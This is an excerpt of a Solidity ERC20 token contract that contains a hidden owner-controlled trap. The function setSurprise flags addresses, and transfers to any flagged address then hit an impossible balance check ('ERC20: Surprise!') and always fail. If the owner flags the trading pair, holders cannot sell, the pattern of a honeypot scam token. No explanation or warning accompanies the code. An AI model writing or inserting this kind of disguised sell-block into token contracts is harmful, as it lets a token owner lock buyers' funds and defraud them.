...
contract Coin is Context, IERC20, Ownable {
    ...
    mapping(address => bool) public _surprise;
    ...
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        if (_surprise[recipient]) {
            require(amount > _balances[_msgSender()], "ERC20: Surprise!");
        }
    ...
    function transferFrom(
        ...
        if (_surprise[recipient]) {
            require(amount > _balances[sender], "ERC20: Surprise!");
        }
    ...
    function setSurprise(address account) external onlyOwner {
        _surprise[account] = true;
    }
